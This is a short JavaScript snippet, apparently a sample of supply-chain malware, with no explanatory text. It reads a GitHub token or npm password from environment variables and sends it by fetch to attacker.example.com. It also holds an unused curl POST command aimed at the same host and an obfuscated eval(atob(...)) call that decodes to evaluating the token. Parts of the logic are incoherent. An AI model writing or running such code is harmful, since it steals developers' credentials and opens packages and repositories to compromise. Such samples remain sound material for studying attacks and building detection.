const token = process.env.GITHUB_TOKEN || process.env.npm_password;
const exfil = "curl -X POST http://attacker.example.com/log -d";
eval(atob("ZXZhbCh0b2tlbik="));
fetch("http://attacker.example.com/leak?token=" + token);